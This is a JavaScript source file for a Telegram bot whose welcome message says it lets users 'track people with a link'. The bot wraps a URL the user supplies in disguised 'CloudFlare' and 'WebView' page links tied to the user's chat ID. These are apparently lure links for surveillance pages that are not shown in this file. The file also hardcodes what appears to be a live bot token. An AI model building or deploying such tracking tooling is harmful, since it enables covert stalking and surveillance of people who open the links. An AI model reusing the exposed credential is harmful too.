require('dotenv').config();
const express = require("express");
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const token = '7261465427:AAGmeZKIc19ljXrK2C1OJR4WhR_9KZQiny0';
const hostURL = 'https://basaaska.vercel.app';

const bot = new TelegramBot(token);
bot.setWebHook(`${hostURL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    console.log('Received request:', req.body);
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Bot logic
bot.on('message', async (msg) => {
    console.log('Received message:', msg);
    const chatId = msg.chat.id;
    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
        const m = {
            reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
        };
        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name}! Use this bot to track people with a link. Type /help for more info.`, m);
    } else if (msg.text == "/create") {
        createNew(chatId);
    } else if (msg.text == "/help") {
        bot.sendMessage(chatId, `Send /create to begin and follow the instructions.`);
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    console.log('Received callback query:', callbackQuery);
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

async function createLink(cid, msg) {
    console.log('Creating link for:', cid, msg);
    if (msg.toLowerCase().includes('http')) {
        const url = `${cid.toString(36)}/${Buffer.from(msg).toString('base64')}`;
        const cUrl = `${hostURL}/c/${url}`;
        const wUrl = `${hostURL}/w/${url}`;
        const m = {
            reply_markup: JSON.stringify({ "inline_keyboard": [{ text: "Create new Link", callback_data: "crenew" }] })
        };
        bot.sendMessage(cid, `New links created. \nCloudFlare Page Link: ${cUrl}\nWebView Page Link: ${wUrl}`, m);
    } else {
        bot.sendMessage(cid, `⚠️ Please enter a valid URL including http or https.`);
        createNew(cid);
    }
}

function createNew(cid) {
    console.log('Creating new prompt for:', cid);
    const mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
    res.json({ message: "Bot is running!" });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`App running on port ${port}`);
});
